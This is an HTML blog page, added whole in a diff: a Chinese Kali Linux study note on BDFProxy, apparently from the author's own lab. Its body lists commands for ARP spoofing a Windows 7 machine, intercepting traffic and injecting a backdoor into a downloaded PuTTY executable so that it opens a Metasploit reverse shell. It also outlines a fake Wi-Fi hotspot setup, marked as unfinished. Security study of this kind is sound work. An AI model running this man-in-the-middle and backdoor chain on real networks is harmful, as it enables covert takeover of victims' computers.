@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="安全," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="1. Bdfproxy Bdfproxy(mitmproxy) 基于流量劫持动态注入shellcode（ARP spoof、DNS spoof、Fake AP）   补充内容 全站HTTPS防注入（微软每个补丁都带马） PE文件证书签名可被清除 PE Header -&amp;gt; Optional Header -&amp;gt; Certificate Table（Address and size） 全部">
+<meta name="keywords" content="安全">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kali Linux笔记(九十四)：BDFProxy">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;02&#x2F;15&#x2F;Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%9B%9B)%EF%BC%9ABDFProxy&#x2F;index.html">
+<meta property="og:site_name" content="Tomas&#39;Blog">
+<meta property="og:description" content="1. Bdfproxy Bdfproxy(mitmproxy) 基于流量劫持动态注入shellcode（ARP spoof、DNS spoof、Fake AP）   补充内容 全站HTTPS防注入（微软每个补丁都带马） PE文件证书签名可被清除 PE Header -&amp;gt; Optional Header -&amp;gt; Certificate Table（Address and size） 全部">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=9336aWJqiZjtaArClI5zv5GF7qvZA6KpPHKRugRf2TAOe6D-oobV0bvsV0xCtK4XB0Df3zGDAsxanUdAKP_qoQZk3XTZaTI_o29Y-y6yLsYAgqMxGEGji0QUAH33O9OvIQYprCA598ZfaA&amp;file_name=&#x2F;Josh%20and%20Mark%20Russinovich.PNG">
+<meta property="og:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=1386ldfYFKX89GHYbJgsh34v1abCDXFs2nnTCpjfES3apTdZwpB7LzjPN84NiQWfUijXC1U7QrA_p2Uk40T8U4pgG-uzbWwn2GEWRaDbj-RKy1l9npfl9Q&amp;file_name=&#x2F;Fake%20AP.PNG">
+<meta property="og:updated_time" content="2020-02-15T04:53:22.512Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http:&#x2F;&#x2F;aliyun.wuyidaxue.top:8088&#x2F;kodex&#x2F;index.php?user&#x2F;publicLink&amp;fid=9336aWJqiZjtaArClI5zv5GF7qvZA6KpPHKRugRf2TAOe6D-oobV0bvsV0xCtK4XB0Df3zGDAsxanUdAKP_qoQZk3XTZaTI_o29Y-y6yLsYAgqMxGEGji0QUAH33O9OvIQYprCA598ZfaA&amp;file_name=&#x2F;Josh%20and%20Mark%20Russinovich.PNG">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/02/15/Kali Linux笔记(九十四)：BDFProxy/"/>
+
+
+
+
+
+  <title>Kali Linux笔记(九十四)：BDFProxy | Tomas'Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tomas'Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E5%9B%9B)%EF%BC%9ABDFProxy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tomas">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/photo.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tomas'Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Kali Linux笔记(九十四)：BDFProxy</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-02-15T12:53:34+08:00">
+                2020-02-15
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Kali/" itemprop="url" rel="index">
+                    <span itemprop="name">Kali</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  557 字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  2 分钟
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <hr>
+<h4 id="1-Bdfproxy"><a href="#1-Bdfproxy" class="headerlink" title="1. Bdfproxy"></a>1. Bdfproxy</h4><ul>
+<li>Bdfproxy(mitmproxy)<ul>
+<li>基于流量劫持动态注入shellcode（ARP spoof、DNS spoof、Fake AP）</li>
+</ul>
+</li>
+<li>补充内容<ul>
+<li>全站HTTPS防注入（微软每个补丁都带马）</li>
+<li>PE文件证书签名可被清除</li>
+<li>PE Header -&gt; Optional Header -&gt; Certificate Table（Address and size）<ul>
+<li>全部用0覆盖</li>
+<li>BDF默认清除数字签名</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="https://live.sysinternals.com/" target="_blank" rel="noopener">https://live.sysinternals.com/</a></li>
+<li>▲ 2020.2.15 BDFProxy已不再受支持</li>
+<li>▲ 2020.2.15 BDFProxy的链接<a href="https://github.com/secretsquirrel/BDFProxy.git" target="_blank" rel="noopener">https://github.com/secretsquirrel/BDFProxy.git</a></li>
+<li>▲ 2020.2.15 BDFProxy的模块导入存在问题</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=9336aWJqiZjtaArClI5zv5GF7qvZA6KpPHKRugRf2TAOe6D-oobV0bvsV0xCtK4XB0Df3zGDAsxanUdAKP_qoQZk3XTZaTI_o29Y-y6yLsYAgqMxGEGji0QUAH33O9OvIQYprCA598ZfaA&file_name=/Josh%20and%20Mark%20Russinovich.PNG" alt="Josh and Mark Russionovich"></p>
+<h4 id="2-bdfproxy–ARP-spoof"><a href="#2-bdfproxy–ARP-spoof" class="headerlink" title="2. bdfproxy–ARP spoof"></a>2. bdfproxy–ARP spoof</h4><ul>
+<li>Kali<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：apt-get install mitmproxy,backdoor-factory,bdfproxy</code></strong></li>
+<li><strong><code>🔺命令：sysctl -w net.ipv4.ip_forward=1</code></strong> </li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -p tcp --dport 80/443 -j REDIRECT --to-ports 8080</code></strong></li>
+<li><strong><code>🔺命令：iptables -L</code></strong>（查看防火墙转发规则）</li>
+<li><strong><code>🔺命令：vi /etc/bdfproxy/bdfproxy.cfg</code></strong> <ul>
+<li>proxyMode = transparent</li>
+<li>HOST = Kali的IP（所有的HOST需要修改）</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：bdfproxy</code></strong>（生成一个rc文件）</li>
+<li><strong><code>🔺命令：msfdb init</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</code></strong><ul>
+<li><strong><code>🔺命令：jobs</code></strong></li>
+</ul>
+</li>
+<li><strong><code>🔺命令：arpspoof -i eth0 -t Window7的IP Kali的IP</code></strong></li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>网卡方式为Bridge方式，桥接到无线网络，检查网络</li>
+<li><strong><code>🔺命令：ipconfig</code></strong>查看IP地址</li>
+<li><strong><code>🔺命令：arp -a</code></strong>查看网关MAC地址</li>
+<li>在Kali欺骗之后，再次<strong><code>🔺命令：arp -a</code></strong>查看MAC地址</li>
+<li>网页访问Putty官网下载putty</li>
+<li>双击下载的putty</li>
+</ul>
+</li>
+<li>Kali<ul>
+<li>查看流量日志是否注入成功</li>
+<li>在win7开启putty后，是否有反弹的shell</li>
+<li><strong><code>🔺命令：session -i 1</code></strong></li>
+<li><strong><code>🔺命令：shell</code></strong></li>
+</ul>
+</li>
+</ul>
+<h4 id="3-bdfproxy–Fack-AP"><a href="#3-bdfproxy–Fack-AP" class="headerlink" title="3. bdfproxy–Fack AP"></a>3. bdfproxy–Fack AP</h4><ul>
+<li>▲ 2020.2.15 因无无线网卡，此实验暂无完成</li>
+<li>Mana创建Fack AP</li>
+<li>Bdfproxy代理注入代码</li>
+<li>Msf侦听反弹shell</li>
+<li>Kali<ul>
+<li><strong><code>🔺命令：apt-get install mana-toolkit</code></strong></li>
+<li><strong><code>🔺命令：reboot</code></strong> </li>
+<li><strong><code>🔺命令：vi /etc/mana-toolkit/hostapd-mana.conf</code></strong><ul>
+<li>修改无线SSID名称 → kfc-free</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：./usr/share/mana-toolkit/run-mana/start-nat-simple.sh</code></strong><ul>
+<li>▲ 需要插无线网卡</li>
+<li>修改phy的名称为插入的无线网卡设备号名称</li>
+<li>清空iptables的规则</li>
+<li><strong><code>🔺命令：iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80/443 -j REDIRECT --to-port 8080</code></strong></li>
+<li><strong><code>🔺命令：./mana.sh</code></strong>（可能需要多次重启）</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：vi /etc/bdfproxy/bdfproxy.cfg</code></strong> <ul>
+<li>proxyMode = transparent</li>
+<li>HOST = Kali的IP（所有的HOST需要修改）</li>
+</ul>
+</li>
+<li><strong><code>🔺命令：bdfproxy</code></strong>（生成一个rc文件）</li>
+<li><strong><code>🔺命令：msfdb init</code></strong></li>
+<li><strong><code>🔺命令：msfconsole -r /usr/share/bdfproxy/bdfproxy_msf_resource.rc</code></strong><ul>
+<li><strong><code>🔺命令：jobs</code></strong></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>Window 7<ul>
+<li>安装无线连接驱动（需插入无线网卡），连接wifi（kfc-free）</li>
+<li>上网尝试</li>
+</ul>
+</li>
+</ul>
+<p><img src="http://aliyun.wuyidaxue.top:8088/kodex/index.php?user/publicLink&fid=1386ldfYFKX89GHYbJgsh34v1abCDXFs2nnTCpjfES3apTdZwpB7LzjPN84NiQWfUijXC1U7QrA_p2Uk40T8U4pgG-uzbWwn2GEWRaDbj-RKy1l9npfl9Q&file_name=/Fake%20AP.PNG" alt="Fack AP"></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/%E5%AE%89%E5%85%A8/" rel="tag"># 安全</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/02/15/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B9%9D%E5%8D%81%E4%B8%89)%EF%BC%9ABackdoor-factory/" rel="next" title="Kali Linux笔记(九十三)：Backdoor-factory">
+                <i class="fa fa-chevron-left"></i> Kali Linux笔记(九十三)：Backdoor-factory
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/photo.jpg"
+                alt="Tomas" />
+            
+              <p class="site-author-name" itemprop="name">Tomas</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">101</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-name">标签</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:643008933@qq.com" target="_blank" title="QQ邮箱">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>QQ邮箱</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-Bdfproxy"><span class="nav-number">1.</span> <span class="nav-text">1. Bdfproxy</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-bdfproxy–ARP-spoof"><span class="nav-number">2.</span> <span class="nav-text">2. bdfproxy–ARP spoof</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-bdfproxy–Fack-AP"><span class="nav-number">3.</span> <span class="nav-text">3. bdfproxy–Fack AP</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Tomas</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">98.3k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
